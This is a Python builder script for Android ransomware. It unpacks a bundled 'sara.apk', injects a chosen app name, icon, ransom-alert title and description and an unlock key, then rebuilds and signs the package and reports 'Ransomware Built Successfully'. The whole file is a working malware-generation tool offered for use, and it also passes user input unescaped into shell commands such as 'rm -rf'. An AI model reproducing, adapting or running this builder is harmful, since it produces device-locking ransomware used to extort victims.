#! /usr/bin/env python3
import os, sys, time, fileinput
from getpass import getpass
from PIL import Image


app_icon = ""
app_name = ""
alert_title = ""
alert_desc = ""
key_pass = ""

def writefile(file,old,new):
    while True:
        if os.path.isfile(file):
            replaces = {old:new}
            for line in fileinput.input(file, inplace=True):
                for search in replaces:
                    replaced = replaces[search]
                    line = line.replace(search,replaced)
                print(line, end="")
            break
        else: exit(" Failed to write in file "+file)

def start():
    global app_icon, app_name, alert_title, alert_desc, key_pass
    os.system("clear")
    ask = input(" Do you agree (y/n): ").lower()
    if ask in ("yes"): pass
    else: exit(" Dont be evil !")
    while True:
        x = input("* SET app_icon (PNG only): ")
        if os.path.isfile(x):
            if ".png" in x:
                app_icon = x
                break
            else: print(" File not accepted, PNG format only !")
        else: print(" File not found, please fill correctly !")
    while True:
        x = input("* SET app_name: ")
        if len(x) != 0:
            app_name = x
            break
        else: continue
    while True:
        x = input("* SET title: ")
        if len(x) != 0:
            alert_title = x
            break
        else: continue
    while True:
        x = input("* SET description: ")
        if len(x) != 0:
            alert_desc = x
            break
        else: continue
    while True:
        x = input("* SET unlock key: ")
        if len(x) != 0:
            key_pass = x
            break
        else: continue
    print("* Building your ransomware APK's ...")
    print("-"*43)
    os.system("apktool d sara.apk")
    imgpath = [
        "sara/res/drawable-mdpi-v4/ic_launcher.png",
        "sara/res/drawable-xhdpi-v4/ic_launcher.png",
        "sara/res/drawable-hdpi-v4/ic_launcher.png",
        "sara/res/drawable-xxhdpi-v4/ic_launcher.png",
    ]
    strings = "sara/res/values/strings.xml"
    print("I: Using strings "+strings)
    smali = os.popen(f"find -L sara/ -name '*0000.smali'","r").readline().strip()
    print("I: Using smali "+os.path.basename(smali))
    writefile(strings,"appname",app_name)
    print("I: Adding name with "+app_name)
    writefile(strings,"alert_title",alert_title)
    print("I: Adding title with "+alert_title)
    writefile(strings,"alert_desc",alert_desc)
    print("I: Adding description with "+str(len(alert_desc))+" words")
    writefile(smali,"key_pass",key_pass)
    print("I: Adding unlock key with "+key_pass)
    time.sleep(3)
    for path in imgpath:
        if os.path.isfile(path):
            with Image.open(path) as target:
                width, height = target.size
                size = str(width)+"x"+str(height)
                logo = os.path.basename(app_icon)
                os.system("cp -R "+app_icon+" "+logo)
                os.system("mogrify -resize "+size+" "+logo+";cp -R "+logo+" "+path)
                os.system("rm -rf "+logo)
                print("I: Adding icon with "+os.path.basename(app_icon)+" size: "+size)
        else: exit(1)
    os.system("apktool b sara -o final.apk;rm -rf sara")
    os.system("java -jar ubersigner.jar -a final.apk --ks debug.jks --ksAlias debugging --ksPass debugging --ksKeyPass debugging > /dev/null 2>&1")
    os.system("java -jar ubersigner.jar -a final.apk --onlyVerify > /dev/null 2>&1")
    os.system("rm -rf final.apk")
    if os.path.isfile("final-aligned-signed.apk"):
        out = app_name.replace(" ","").lower() + ".apk"
        os.system("mv final-aligned-signed.apk "+out)
        print(" Ransomware Built Successfully ")
    else: print(" Failed to signed APK's")

if __name__ == "__main__":
    try:
        start()
    except KeyboardInterrupt:
        exit("exiting ...")
        